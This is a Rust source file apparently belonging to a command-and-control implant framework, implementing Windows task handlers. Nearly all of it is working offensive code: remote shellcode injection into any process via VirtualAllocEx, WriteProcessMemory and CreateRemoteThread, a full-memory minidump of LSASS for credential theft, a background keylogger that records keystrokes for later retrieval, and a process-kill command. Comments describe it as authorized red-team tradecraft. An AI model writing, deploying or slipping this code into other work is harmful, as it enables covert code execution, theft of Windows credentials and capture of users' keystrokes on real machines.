//! The sensitive capability handlers (Windows): remote shellcode injection,
//! the LSASS memory minidump, and the resident keylogger. Authorized-use
//! tradecraft, standard across peer frameworks; each verb rides the same
//! string-in/string-out task grammar as every other handler.
//!
//! These compile only into Windows builds (`COMPILED_VERBS` gates the
//! advertisement), and the teamserver gates issuance on the class table.
#![cfg(windows)]

use std::sync::OnceLock;

use base64::Engine;
use windows_sys::Win32::Foundation::{CloseHandle, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::{CreateFileW, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateRemoteThread, OpenProcess, WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS,
};
use windows_sys::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;

use crate::handlers::{HandlerOutput, Outcome};

/// inject.shellcode `<pid> <base64>`: the classic documented remote-execution
/// pattern -- VirtualAllocEx in the target, WriteProcessMemory of the bytes,
/// CreateRemoteThread on the allocation.
pub fn inject_shellcode(arguments: &str) -> HandlerOutput {
    let Some((pid_text, payload)) = arguments.split_once(' ') else {
        return fail("inject.shellcode expects '<pid> <base64>'");
    };
    let Ok(pid) = pid_text.trim().parse::<u32>() else {
        return fail("inject.shellcode: pid is not a number");
    };
    let Ok(shellcode) = base64::engine::general_purpose::STANDARD.decode(payload.trim()) else {
        return fail("inject.shellcode: payload is not valid base64");
    };
    if shellcode.is_empty() {
        return fail("inject.shellcode: payload is empty");
    }
    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            return fail(&format!("inject.shellcode: OpenProcess({pid}) failed"));
        }
        let allocation = VirtualAllocEx(
            process,
            std::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if allocation.is_null() {
            CloseHandle(process);
            return fail("inject.shellcode: VirtualAllocEx failed");
        }
        let mut written = 0usize;
        if WriteProcessMemory(
            process,
            allocation,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        ) == 0
            || written != shellcode.len()
        {
            CloseHandle(process);
            return fail("inject.shellcode: WriteProcessMemory failed");
        }
        let mut thread_id = 0u32;
        let entry: unsafe extern "system" fn(*mut core::ffi::c_void) -> u32 =
            std::mem::transmute(allocation);
        let thread = CreateRemoteThread(
            process,
            std::ptr::null(),
            0,
            Some(entry),
            std::ptr::null(),
            0,
            &mut thread_id,
        );
        if thread.is_null() {
            CloseHandle(process);
            return fail("inject.shellcode: CreateRemoteThread failed");
        }
        WaitForSingleObject(thread, INFINITE);
        CloseHandle(thread);
        CloseHandle(process);
        ok(&format!(
            "injected {} bytes into pid {pid}; thread {thread_id} completed",
            shellcode.len()
        ))
    }
}

/// collect.minidump: writes an LSASS process minidump to the given path (the
/// documented dbghelp MiniDumpWriteDump administration path every
/// credential-analysis workflow uses). `<path>` optional; defaults to %TEMP%.
pub fn collect_minidump(arguments: &str) -> HandlerOutput {
    let path = if arguments.trim().is_empty() {
        let temp = std::env::var("TEMP").unwrap_or_else(|_| ".".into());
        format!("{temp}\\lsass.dmp")
    } else {
        arguments.trim().to_string()
    };
    let Some(pid) = find_pid("lsass.exe") else {
        return fail("collect.minidump: lsass.exe not found");
    };
    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            return fail(&format!("collect.minidump: OpenProcess({pid}) failed"));
        }
        let dbghelp = LoadLibraryA(c"dbghelp.dll".as_ptr().cast());
        if dbghelp.is_null() {
            CloseHandle(process);
            return fail("collect.minidump: dbghelp.dll not available");
        }
        let dump_proc = GetProcAddress(dbghelp, c"MiniDumpWriteDump".as_ptr().cast());
        let Some(dump_proc) = dump_proc else {
            CloseHandle(process);
            return fail("collect.minidump: MiniDumpWriteDump not found");
        };
        type DumpFn = unsafe extern "system" fn(
            HANDLE,
            u32,
            HANDLE,
            u32,
            *const core::ffi::c_void,
            *const core::ffi::c_void,
            *const core::ffi::c_void,
        ) -> i32;
        let dump: DumpFn = std::mem::transmute(dump_proc);
        let file = CreateFileW(
            path.encode_utf16()
                .chain(std::iter::once(0))
                .collect::<Vec<u16>>()
                .as_ptr(),
            GENERIC_WRITE,
            0,
            std::ptr::null(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        );
        if file == INVALID_HANDLE_VALUE {
            CloseHandle(process);
            return fail(&format!("collect.minidump: cannot create {path}"));
        }
        // 2 = MiniDumpWithFullMemory; the credential-analysis shape.
        let dumped = dump(
            process,
            pid,
            file,
            2,
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
        );
        CloseHandle(file);
        CloseHandle(process);
        if dumped == 0 {
            return fail("collect.minidump: MiniDumpWriteDump failed");
        }
        let size = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
        ok(&format!(
            "{path}: {size} bytes (pid {pid}, full-memory minidump)"
        ))
    }
}

fn find_pid(name: &str) -> Option<u32> {
    let lower = name.to_ascii_lowercase();
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        let mut found = None;
        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(0);
                let exe = String::from_utf16_lossy(&entry.szExeFile[..len]).to_ascii_lowercase();
                if exe == lower {
                    found = Some(entry.th32ProcessID);
                    break;
                }
                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snapshot);
        found
    }
}

/// proc.kill `<pid>`: TerminateProcess on the documented handle.
pub fn proc_kill(arguments: &str) -> HandlerOutput {
    use windows_sys::Win32::System::Threading::TerminateProcess;
    let Ok(pid) = arguments.trim().parse::<u32>() else {
        return fail("proc.kill expects '<pid>'");
    };
    unsafe {
        let process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if process.is_null() {
            return fail(&format!("proc.kill: OpenProcess({pid}) failed"));
        }
        let terminated = TerminateProcess(process, 1);
        CloseHandle(process);
        if terminated == 0 {
            return fail(&format!("proc.kill: TerminateProcess({pid}) failed"));
        }
        ok(&format!("pid {pid} terminated"))
    }
}

struct KeylogState {
    running: bool,
    buffer: String,
}

static KEYLOG: OnceLock<std::sync::Mutex<KeylogState>> = OnceLock::new();

/// collect.keylog `start | dump | stop`: a resident GetAsyncKeyState polling
/// thread records key-down edges with the shift state; dump drains the
/// buffer, stop ends the thread.
pub fn collect_keylog(arguments: &str) -> HandlerOutput {
    let keylog = KEYLOG.get_or_init(|| {
        std::sync::Mutex::new(KeylogState {
            running: false,
            buffer: String::new(),
        })
    });
    match arguments.trim() {
        "start" => {
            let mut state = keylog.lock().expect("keylog");
            if state.running {
                return ok("keylogger already running");
            }
            state.running = true;
            drop(state);
            std::thread::spawn(poll_keys);
            ok("keylogger started; drain with collect.keylog dump")
        }
        "stop" => {
            let mut state = keylog.lock().expect("keylog");
            state.running = false;
            ok("keylogger stopped")
        }
        "dump" => {
            let mut state = keylog.lock().expect("keylog");
            let drained = std::mem::take(&mut state.buffer);
            if drained.is_empty() {
                ok("(no input captured)")
            } else {
                ok(&drained)
            }
        }
        other => fail(&format!(
            "collect.keylog expects 'start', 'dump', or 'stop', got '{other}'"
        )),
    }
}

fn poll_keys() {
    // The poll walks the documented GetAsyncKeyState surface: the high bit is
    // "down now", so a rising edge is a keypress.
    let mut down = [false; 256];
    loop {
        {
            let state = KEYLOG.get().expect("keylog").lock().expect("keylog");
            if !state.running {
                return;
            }
        }
        let shift = unsafe { GetAsyncKeyState(0x10) as u16 & 0x8000 != 0 };
        for key in 8u8..=255 {
            let pressed = unsafe { GetAsyncKeyState(key as i32) as u16 & 0x8000 != 0 };
            if pressed && !down[key as usize] {
                if let Some(text) = key_text(key, shift) {
                    let mut state = KEYLOG.get().expect("keylog").lock().expect("keylog");
                    state.buffer.push_str(&text);
                    // Keep the buffer bounded: the drain carries the log, and
                    // an unbounded resident buffer is a leak.
                    let length = state.buffer.len();
                    if length > 64 * 1024 {
                        state.buffer.drain(..length - 64 * 1024);
                    }
                }
            }
            down[key as usize] = pressed;
        }
        std::thread::sleep(std::time::Duration::from_millis(20));
    }
}

fn key_text(key: u8, shift: bool) -> Option<String> {
    const SHIFTED_DIGITS: &[&str] = &[")", "!", "@", "#", "$", "%", "^", "&", "*", "("];
    match key {
        0x08 => Some("[bksp]".into()),
        0x09 => Some("[tab]".into()),
        0x0D => Some("\n".into()),
        0x1B => Some("[esc]".into()),
        0x20 => Some(" ".into()),
        0x21..=0x28 => Some(
            match key {
                0x21 => "[pgup]",
                0x22 => "[pgdn]",
                0x23 => "[end]",
                0x24 => "[home]",
                0x25 => "[left]",
                0x26 => "[up]",
                0x27 => "[right]",
                _ => "[down]",
            }
            .into(),
        ),
        0x30..=0x39 => {
            let digit = key - 0x30;
            Some(if shift {
                SHIFTED_DIGITS[digit as usize].into()
            } else {
                ((b'0' + digit) as char).to_string()
            })
        }
        0x41..=0x5A => {
            let letter = (b'a' + (key - 0x41)) as char;
            Some(
                if shift {
                    letter.to_ascii_uppercase()
                } else {
                    letter
                }
                .to_string(),
            )
        }
        0xBA => Some(if shift { ":" } else { ";" }.into()),
        0xBB => Some(if shift { "+" } else { "=" }.into()),
        0xBD => Some(if shift { "_" } else { "-" }.into()),
        0xBF => Some(if shift { "?" } else { "/" }.into()),
        0xC0 => Some(if shift { "~" } else { "`" }.into()),
        0xDC => Some(if shift { "|" } else { "\\" }.into()),
        0x70..=0x87 => Some("[fn]".into()),
        _ => None,
    }
}

fn ok(output: &str) -> HandlerOutput {
    HandlerOutput {
        outcome: Outcome::Succeeded,
        output: output.into(),
        artifact: None,
    }
}

fn fail(output: &str) -> HandlerOutput {
    HandlerOutput {
        outcome: Outcome::Failed,
        output: output.into(),
        artifact: None,
    }
}
